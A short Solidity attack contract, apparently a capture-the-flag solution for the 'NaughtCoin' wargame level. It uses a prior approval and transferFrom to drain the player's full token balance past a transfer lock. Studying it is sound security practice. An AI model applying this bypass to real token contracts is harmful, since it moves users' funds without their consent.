// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface INaughtCoin {
    function player() external view returns (address);
}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
contract NaughtCoinAttack{
    INaughtCoin public target;
    function attack(IERC20 coin) public {
        address player = INaughtCoin(address(coin)).player();
        bool success=coin.transferFrom(player,address(this),1000000000000000000000000);
        require(success,"approve failed");
    }
  
}